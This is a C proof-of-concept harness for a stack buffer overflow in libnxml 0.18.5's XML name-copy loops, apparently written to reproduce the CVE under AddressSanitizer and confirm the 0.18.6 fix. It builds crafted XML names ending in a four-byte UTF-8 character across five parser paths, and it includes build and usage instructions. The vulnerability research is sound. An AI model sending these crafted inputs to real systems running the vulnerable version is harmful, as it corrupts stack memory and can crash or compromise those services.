/* libnxml CVE-2026-123202 — real-parser ASan harness.
 *
 * Drives the public nxml_parse_buffer() API with an XML name made of N
 * single-byte name characters followed by a four-byte UTF-8 name character.
 * In 0.18.5 the five name-copy loops test only the start offset, so N=1022
 * writes attacker bytes at buf[1022..1025] of a 1024-byte stack buffer plus
 * the trailing NUL at buf[1026]. 0.18.6 tests i+byte < sizeof(buf).
 *
 * Usage: name_overflow [N] [mode]   (default N=1022, mode=0; N=1000 control)
 *   mode 0: element name  <AAA...emoji>
 *   mode 1: close tag     <a></AAA...emoji>
 *   mode 2: attribute     <a AAA...emoji="v">
 *   mode 3: doctype name  <!DOCTYPE AAA...emoji>
 *   mode 4: entity name   <!DOCTYPE a [<!ENTITY AAA...emoji "v">]>
 *
 * Build: clang -g -O0 -fsanitize=address -fno-omit-frame-pointer \
 *          -I<tree>/src -o name_overflow name_overflow.c <tree>/src/.libs/libnxml.a -lcurl
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "nxml.h"

int main(int argc, char **argv) {
  int n = argc > 1 ? atoi(argv[1]) : 1022;
  int mode = argc > 2 ? atoi(argv[2]) : 0;
  /* U+1F600: F0 9F 98 80 — valid XML NameChar, decoded as four bytes. */
  static const unsigned char emoji[4] = {0xF0, 0x9F, 0x98, 0x80};
  const char *prefix = mode == 1 ? "<a></" : mode == 2 ? "<a " :
                       mode == 3 ? "<!DOCTYPE " :
                       mode == 4 ? "<!DOCTYPE a [<!ENTITY " : "<";
  const char *suffix = mode == 2 ? "=\"v\">" :
                       mode == 4 ? " \"v\">]>" : ">";
  size_t plen = strlen(prefix), slen = strlen(suffix);
  size_t len = plen + (size_t)n + 4 + slen;
  char *xml = malloc(len + 1);
  if (!xml) return 2;

  size_t p = 0;
  memcpy(xml + p, prefix, plen); p += plen;
  memset(xml + p, 'A', (size_t)n); p += (size_t)n;
  memcpy(xml + p, emoji, 4); p += 4;
  memcpy(xml + p, suffix, slen); p += slen;
  xml[p] = 0;

  fprintf(stderr, "INPUT mode=%d n=%d len=%zu\n", mode, n, len);

  nxml_t *doc = NULL;
  if (nxml_new(&doc) != NXML_OK) { free(xml); return 3; }
  nxml_error_t err = nxml_parse_buffer(doc, xml, len);
  fprintf(stderr, "PARSE err=%d\n", (int)err);
  nxml_free(doc);
  free(xml);
  return 0;
}
